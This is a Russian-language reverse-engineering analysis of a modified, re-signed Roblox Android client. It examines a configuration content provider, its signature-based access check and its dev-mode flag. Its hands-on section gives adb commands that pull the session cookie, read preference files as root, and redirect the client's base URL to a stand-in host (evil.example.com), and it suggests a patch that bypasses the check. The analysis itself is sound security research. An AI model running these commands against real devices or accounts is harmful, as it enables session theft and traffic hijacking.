# Пункт 2 глубоко: `ShellConfigurationContentProvider`

Что это на самом деле, что за «ключ» его защищает, что из него можно вытащить и
что можно в него записать. Все ссылки — на распакованные исходники из
`Delta-2.747.1486_FULL_READABLE.zip` (`02_sources/java/…`).

## Короткий ответ

Это **IPC-канал «внешний пульт управления клиентом»**: 7 URI-эндпоинтов, через
которые другое приложение спрашивает у Roblox текущий канал, базовый URL,
настройки, user-agent, dev-RPC, dev-ветку/коммит и **cookie `Cookie: …`** —
и может **записать** новые значения (включая произвольный JSON настроек).

Замок: `protectionLevel=0x2` (signature) → доступ только приложениям,
подписанным **тем же ключом**, что и Roblox. То есть «ключ» здесь работает как
*группа доверия между приложениями одного издателя*, а не как защита от
переподписи.

Второй слой — имя пакета вызывающего: `startsWith("com.roblox.client")` /
`startsWith("com.tencent.roblox")`.

## 1. Полная карта эндпоинтов

`deobf/com/roblox/client/provider/ph/a.java` — enum с именами и кодами:

| URI (`content://<authority>/…`) | id | handler | GET отдаёт | POST принимает |
|---|---|---|---|---|
| `ping.get` | 1 | `lj/g` | пустой курсор (health-check) | — |
| `config.get` | 2 | `lj/d` | 11 столбцов (см. §2) | — |
| `config.post` | 3 | `lj/d` | — | `settings_param`, `channel_param`, `base_url_param`, `user_agent_param`, `dev_branch`, `dev_commit`, `dev_rpc_ip_port_override` |
| `ua.get` | 4 | `lj/j` | `user_agent_param` | — |
| `devrpc.get` | 5 | `lj/f` | `dev_rpc_ip_port_override` | — |
| `devbranchcommit.get` | 6 | `lj/e` | `dev_branch`, `dev_commit` | — |
| `cookie.get` | 7 | `lj/h` | `cookie_header`, **`cookie_value`** | — |

Authority собирается так (`ShellConfigurationContentProvider.b()`):

```java
return context.getPackageName() + context.getString(q0.O1);
// q0.O1 = 2131886615 = 0x7f120217 = "shell_configuration_provider_authority_suffix"
// → "com.roblox.client" + ".ShellConfigurationProvider"
```

Значение строки найдено в `03_resources/resource_table.xml`:
`0x7f120217 → ".ShellConfigurationProvider"`. Так что authority **не
захардкожена** в Java — она собирается из имени пакета, и у Tencent-сборки
(`com.tencent.roblox`) получится своя.

Регистрация роутов (`g()`), 6 обработчиков на 7 роутов: `g`, `d`, `j`, `f`,
`e`, `h`; `d` регистрируется дважды — на `config.get` и `config.post`
(`e(str, iVar)` внутри `f()` на `GET` и `POST`).

`UriMatcher(-1)` — код «нет совпадения» = −1; `query()` для незнакомого URI
вернёт `null` и напишет `No handler found for query`.

## 2. Что реально отдаётся в `config.get`

Столбцы (`kj/b.getColumnNames()`) и источники значений — из
`deobf/unlinked/kj/c.read()`:

| столбец | значение | хранилище |
|---|---|---|
| `channel_param` | `RobloxChannel` | `configure_dev_roblox` (prefs) |
| `default_channel_param` | `""` | константа |
| `base_url_param` | `BaseUrl` | `configure_dev_roblox` |
| `default_base_url_param` | **`"www.roblox.com"`** | константа |
| `settings_param` | JSON из `files/exe/ClientSettings/ClientAppSettings.json` | файл (см. §4) |
| `user_agent_param` | `user_agent` | `configure_dev_roblox` |
| `default_user_agent_param` | вычисленный UA (`a1.m(ctx)`) | код |
| `dev_rpc_ip_port_override` | `dev_rpc_ip_port_override` | `configure_dev_roblox` |
| `dev_branch` | `dev_branch` | `configure_dev_roblox` |
| `dev_commit` | `dev_commit` | `configure_dev_roblox` |
| `browser_tracker_id` | `String.valueOf(a1.f4037u)` | статик, long |

`configure_dev_roblox` создаётся через
`androidx.camera.camera2.z.e(ctx).d(name, true)` — это обёртка над
`getSharedPreferences`; файл лежит в `/data/data/com.roblox.client/shared_prefs/`.
**Обычный SharedPreferences, без шифрования** — читается при root/`adb backup`
(в манифесте `allowBackup="true"`, исключения только в
`@xml/appsflyer_backup_rules`, то есть бэкап не закрыт полностью).

Комментарий к `default_base_url_param`: константа `"www.roblox.com"` — то есть
провайдер сам говорит «по умолчанию прод, всё остальное — оверрайд».

## 3. Что именно значит «ключ» здесь

### 3.1 Объявление (манифест)

```xml
<permission android:name="com.roblox.client.permission.CONFIGURATION"
            android:protectionLevel="0x00000002"/>          <!-- signature -->

<provider android:name="com.roblox.client.provider.ShellConfigurationContentProvider"
          android:permission="com.roblox.client.permission.CONFIGURATION"
          android:exported="true"
          android:authorities="com.roblox.client.ShellConfigurationProvider"/>
```

`0x2 = signature`. Проверку делает **не код приложения**, а
`ActivityManagerService` (`checkContentProviderAccess` →
`checkComponentPermission`) **до** вызова любого метода провайдера. Поэтому
`SecurityException` летит ещё до `query()`; в `ph/d.b()` она просто
проглатывается:

```java
try   { return context.getContentResolver().query(uri, PROJ, null, null, null); }
catch (SecurityException unused) { return null; }
```

Практическое следствие: разрешение **объявлено самим приложением**, значит
оно валидно только внутри семейства сборок Roblox. Любая переподпись
(в этой сборке — ключ `O=Gloop, CN=Gloopiest Man`) переносит и провайдер, и
разрешение на новый ключ: приложение, подписанное **тем же ключом Gloop** и
объявившее `<uses-permission android:name="com.roblox.client.permission.CONFIGURATION"/>`,
получит доступ. Это и есть «ключ»: группа доверия по сертификату.

### 3.2 Второй слой — проверка имени пакета в коде

```java
public final boolean a() {                     // ShellConfigurationContentProvider
    if (b.a()) return true;                    // wh/b.a() — константа false
    String callingPackage = getCallingPackage();
    if (callingPackage != null)
        return callingPackage.startsWith("com.roblox.client")
            || callingPackage.startsWith("com.tencent.roblox");
    return false;
}
```

Три детали, которые важны:

1. `getCallingPackage()` может быть `null` (система, некоторые вызовы не из
   Activity) → возвращается `false`, то есть **fail-closed**: нет имени — нет
   доступа.
2. Проверка — `startsWith`, а не `equals`. Пакет `com.roblox.client.anything`
   проходит по имени, но **всё равно обязан пройти проверку подписи** из §3.1.
   Так что префикс — только defense-in-depth, не дыра.
3. `wh/b.a()` — **константа `false`, захардкоженная в отдельном классе**:

```java
// deobf/com/roblox/client/provider/wh/b.java
public class b { public static boolean a() { return false; } }
```

Это единственная точка, через которую включается весь «dev-режим» клиента
(см. §6). Патч одного `return` → `return true` переключает поведение сразу в
нескольких подсистемах.

### 3.3 Чего в нативном коде нет

Проверено побайтово по `lib/arm64-v8a/libroblox.so`: строк
`ShellConfigurationProvider`, `rbx.config`, `config.get`, `devrpc.get`,
`cookie.get`, `ping.get`, `dev_rpc_ip_port_override`, `com.tencent.roblox`,
`getCallingPackage` — **0 вхождений**. Движок про этот канал не знает вообще:
он получает значения уже через `NativeSettingsInterface` (`nativeSetBaseUrl`,
`nativeSetRobloxChannel`, `nativeConfigureDevRpc`,
`DevBranchAndCommitInterface.nativeSetDevBranchCommitAndTrigger`).

## 4. Два разных `ClientAppSettings.json` — не перепутать

`deobf/unlinked/ek/a.java` работает с **двумя** файлами:

| файл | кто читает | кто пишет | что это |
|---|---|---|---|
| `/data/local/tmp/ClientAppSettings.json` | `h()` / `a()` (overridePayload) | **никто в приложении** | внешний «пульт»: adb/root/другое приложение |
| `files/exe/ClientSettings/ClientAppSettings.json` | `j()` (→ `settings_param`) | `k(String)` из `config.post` | внутренняя копия, пишется по IPC |

Ключевая разница:

* внешний `/data/local/tmp/…` попадает в `nativeInitClientSettingsSigned(...)`
  **безусловно** (`ei/f.java:165-174`: `o10 = new ek.a(ctx).a()`), то есть
  нативная инициализация получает его как `localOverrides`. Применяет ли она
  их в релизной сборке — решает уже нативная сторона (в строках `libroblox.so`
  есть `ClientAppSettings`, `configurationNamespaces`, `Success`), но **файл
  читается и передаётся всегда**;
* применение этих же данных к shell-флагам (`startup/a.l()`) идёт **только**
  при `wh/b.a() == true`;
* внутренний файл — это то, что отдаётся в `settings_param` и что можно
  перезаписать через `config.post`.

Формат: плоский JSON вида `{"FFlagXxx": true, "FIntYyy": 10, "FStringZzz": "s"}` —
именно так его раскладывает `wh/a.c()/d()`:

```java
if (aVar instanceof a.d) return "FFlag"  + str;   // boolean
if (aVar instanceof a.f) return "FInt"   + str;   // integer
if (aVar instanceof a.g) return "FString" + str;  // string
```

## 5. `config.post` — запись по IPC (важное место)

`lj/d.c()` — единственный обработчик `insert()`. Валидации **нет ни на одном
поле**, значения пишутся как есть:

```java
if (cv.containsKey("settings_param"))  { f().l(json);  g().b(json);  }   // JSON парсится, при ошибке Log.w("Settings parse error") и пустой объект
if (cv.containsKey("channel_param"))   { f().r(v);     g().g(v); }      // prefs RobloxChannel
if (cv.containsKey("base_url_param"))  { f().m(v);     g().c(v); }      // prefs BaseUrl
if (cv.containsKey("user_agent_param")){ f().s(v);     g().e(v); }      // prefs user_agent
if (cv.containsKey("dev_branch")||cv.containsKey("dev_commit")) {
        wh.c.d(ctx, branch, commit);        // prefs + nativeSetDevBranchCommitAndTrigger
        Handler → Toast "…"                 // q0.R
}
if (cv.containsKey("dev_rpc_ip_port_override")) {
        t.e(ctx, v);                        // prefs + nativeConfigureDevRpc
        Handler → Toast; if (k0.v()) a1.Q0(true);
}
```

Заметьте: `base_url_param` пишется **без проверки схемы и хоста**. Дальше
`a1.i0()` вызывает `K0(str)` → `new ok.e(str)` → и весь клиент (все
`https://<service>.` + base) уезжает на чужой домен. `ok.e(str)` только срезает
`^http:/*|^https:/*` и хвостовые `/`, то есть принимает **и `http://`**, и
голый хост.

Доступно это, повторюсь, только приложению с тем же сертификатом
(иначе `SecurityException` на входе). Нативный код при этом не участвует:
`nativeSetBaseUrl` уже принимает готовое значение.

Побочный эффект: и `dev_branch`/`dev_commit`, и `dev_rpc` пишут prefs и дёргают
нативку, а потом показывают пользователю Toast `q0.R` — то есть запись через
`config.post` намеренно **видима** (это dev-инструмент для инженеров, а не
скрытый канал).

## 6. Где `wh/b.a()` разрастается в «режим разработчика»

`grep -rn "provider.wh.b.a()"` даёт **71 вызов** — это не только провайдер:

| место | что включает |
|---|---|
| `provider/ShellConfigurationContentProvider.a()` | обход проверки имени пакета |
| `startup/a.l()` (×2) | применение `/data/local/tmp/ClientAppSettings.json` и локальных настроек к флагам |
| `ei/f.java:165` | `overridePayload` берётся из `startup.a.o()` (накопленный dev-набор), иначе из файла |
| `bh/y1.java:706` | **`WebView.setWebContentsDebuggingEnabled(true)`** — remote-отладка всех WebView (`chrome://inspect`) |
| `ok/z.java:44-50`, `z.g()` | префикс имени prefs: `<baseUrl>_prefs` вместо `prefs` (только если base URL содержит `.robloxlabs.com`) — изоляция окружений |
| `nj/n.java` (29 методов) | методы-обёртки над `dj/g` (состояние покупок/аккаунта) не выполняются — ранний `return` |
| `provider/wh/d.b()` | no-op вместо реального действия |

То есть один флаг переводит клиент в «песочницу разработчика»: отдельные
prefs, дебаг WebView, отключённый магазин.

## 7. Кто это читает на старте (поток целиком)

У провайдера две роли — источник и приёмник:

**Приём (старт приложения):**
`ShellConfigurationContentProvider.onCreate()` →
`new kj.c(context)` → `read()` → `ph.c` → `a1.L0(c)` (`K0` base URL) →
`x.m().F(appCtx)` / `E()` (менеджер стартапов).
То есть провайдер инициализируется **раньше Activity** (провайдеры поднимаются
до `Application.onCreate`) и сразу же применяет сохранённый base URL.

**Чтение изнутри приложения:**
`startup/ik/r2.c(context)` → `a1.i0(context, new ph.d(context).a(context))` —
через `ContentResolver` к **своему** провайдеру (same-UID → разрешение не
требуется). Дальше `a1.i0()` — это и есть «диспетчер конфига»:
`Settings.Global "roblox_channel_override"` → `channel` из prefs →
`BaseApiUrl` из `configure_dev_roblox` → `P0(channel)` / `K0(baseUrl)`.
Приоритеты: `f4023g` (канал задан из `BuildConfig`) блокирует override.

**Дефолты (`static {}` в a1):** `K0("www.roblox.com")`, `P0("")` → `www.roblox.com`.
Всё остальное — оверрайды поверх.

## 8. Как это проверить руками

```bash
# 1) провайдер и разрешение в манифесте
aapt2 dump permissions Delta-2.747.1486.apk | grep -A2 CONFIGURATION
aapt2 dump xmltree --file AndroidManifest.xml Delta-2.747.1486.apk | grep -A5 ShellConfiguration

# 2) состояние разрешения на устройстве
adb shell dumpsys package com.roblox.client | grep -A4 "permission.CONFIGURATION"

# 3) попытка чтения от shell (должно упасть на подписи)
adb shell content query --uri content://com.roblox.client.ShellConfigurationProvider/ping.get
#   → SecurityException: Permission Denial: opening provider … requires com.roblox.client.permission.CONFIGURATION

# 4) то же с root (обход) — видно весь конфиг
adb shell su -c "content query --uri content://com.roblox.client.ShellConfigurationProvider/config.get"

# 5) cookie наружу (только same-signature!)
adb shell content query --uri content://com.roblox.client.ShellConfigurationProvider/cookie.get

# 6) перехват: что клиент читает у себя
adb logcat | grep -E "rbx.config|roblox.config"

# 7) содержимое prefs и обоих ClientAppSettings.json (root)
adb shell su -c "cat /data/data/com.roblox.client/shared_prefs/configure_dev_roblox.xml"
adb shell su -c "cat /data/data/com.roblox.client/files/exe/ClientSettings/ClientAppSettings.json"
adb shell su -c "cat /data/local/tmp/ClientAppSettings.json"
```

Демонстрация записи (нужен APK, подписанный тем же ключом, что установленный
клиент, либо патч `wh/b.a()`):

```bash
# подложить base URL и настройки; ContentValues → query-параметры
adb shell content insert \
  --uri "content://com.roblox.client.ShellConfigurationProvider/config.post" \
  --bind base_url_param:s:evil.example.com \
  --bind settings_param:s:'{"FFlagExample":true}'
# после перезапуска: logcat "roblox.config initConfig: Set base-URL from: www.roblox.com => evil.example.com"
```

## 9. Итог по пункту 2

1. Провайдер — это **7-эндпоинтный IPC-шлюз** к конфигу клиента, включая
   `cookie.get` (отдаёт `Cookie: …` со всей сессией).
2. «Ключ» = `protectionLevel=signature`: доверие **по сертификату**, проверка в
   `ActivityManagerService`, код приложения её не дублирует. Плюс префикс имени
   пакета (fail-closed при `null`).
3. Поэтому переподпись не «ломает» провайдер — она **перевозит** и разрешение,
   и провайдер на новый ключ. Практический риск: любое приложение, подписанное
   тем же ключом, что установленный клиент, читает cookie и меняет base URL
   без рута.
4. Внутри кода единственный переключатель — `wh/b.a()`, константа `false`;
   она же включает dev-режим, дебаг WebView и изоляцию prefs.
5. Нативный код к каналу не причастен — все строки отсутствуют в
   `libroblox.so`; значения приходят в движок только через
   `NativeSettingsInterface` / `DevBranchAndCommitInterface`.
6. По-настоящему «внешний» источник флагов — `/data/local/tmp/ClientAppSettings.json`:
   приложение его **не пишет**, но читает и всегда передаёт в
   `nativeInitClientSettingsSigned` как `localOverrides`.
